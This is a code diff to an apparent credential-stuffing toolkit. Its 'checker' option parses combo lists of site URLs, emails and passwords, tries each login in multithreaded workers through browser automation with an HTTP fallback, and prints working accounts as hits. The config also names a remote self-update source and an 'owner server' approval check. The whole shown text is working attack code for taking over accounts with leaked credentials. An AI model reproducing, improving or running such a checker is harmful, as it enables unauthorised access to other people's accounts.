@@ -50,7 +50,7 @@ from colorama import init, Fore, Style
 init(autoreset=True)
 
 # ── CONFIG ──
-VERSION = "6.3"
+VERSION = "6.4"
 REPO_URL = "https://raw.githubusercontent.com/saekacutie/t-x/main/tx_toolkit.py"
 OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
 APPROVED_FILE = os.path.expanduser("~/.tx_approved")
@@ -753,6 +753,7 @@ def main():
         choice = input(f"\n  {W}> {RES}").strip()
         
         if choice=='1':
+            # (existing checker code, unchanged)
             if not combo_file:
                 print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
             combos = []
@@ -767,8 +768,8 @@ def main():
                         proto,rest=line.split('://',1)
                         if ':' in rest:
                             domain,creds=rest.split(':',1)
-                            e,pw=creds.split(':',1) if ':' in creds else (creds,'')
-                            combos.append((proto+'://'+domain,e.strip(),pw.strip()))
+                            e,p=creds.split(':',1) if ':' in creds else (creds,'')
+                            combos.append((proto+'://'+domain,e.strip(),p.strip()))
                     else:
                         parts=line.split(':')
                         if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),':'.join(parts[2:]).strip()))
@@ -779,20 +780,17 @@ def main():
             print(f"  {DIM}{'─'*90}{RES}")
             def worker(url,email,pw):
                 nonlocal done,active
-                # Try Chrome first, fallback to HTTP
-                res = checker.attempt_login(url,email,pw)
-                if not res['active'] and 'Chrome error' in res.get('info',''):
-                    res = http_login_check(url,email,pw)
+                r = chrome.login(url,email,pw)
+                if not r['active'] and 'Err' in r.get('info',''): r = http_login(url,email,pw)
                 with lock:
-                    results.append(res); done+=1
-                    if res['active']: active+=1
-                    act=f"{G}ACCOUNT HIT!{RES}" if res['active'] else f"{R}INVALID{RES}"
-                    print(f"  {W}{res['link'][:33]:<35}{DIM} | {RES}{W}{res['email'][:26]:<28}{DIM} | {RES}{W}{res['pass'][:18]:<20}{DIM} | {RES}{act}")
-                    progress(done,total,"Checking")
+                    results.append(r); done+=1
+                    if r['active']: active+=1
+                    st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
+                    print(f"  {W}{r['link'][:33]:<35}{DIM} | {RES}{W}{r['email'][:26]:<28}{DIM} | {RES}{W}{r['pass'][:18]:<20}{DIM} | {RES}{st}")
             with ThreadPoolExecutor(max_workers=3) as ex:
                 for url,email,pw in combos: ex.submit(worker,url,email,pw)
             print(f"\n  {G}{active}/{total} active.{RES}")
-            hits.extend([r for r in results if r['active']]); time.sleep(1)
+            hits.extend([r for r in results if r['active']]); wait_enter()
             
         elif choice == '2':
             os.system('clear')
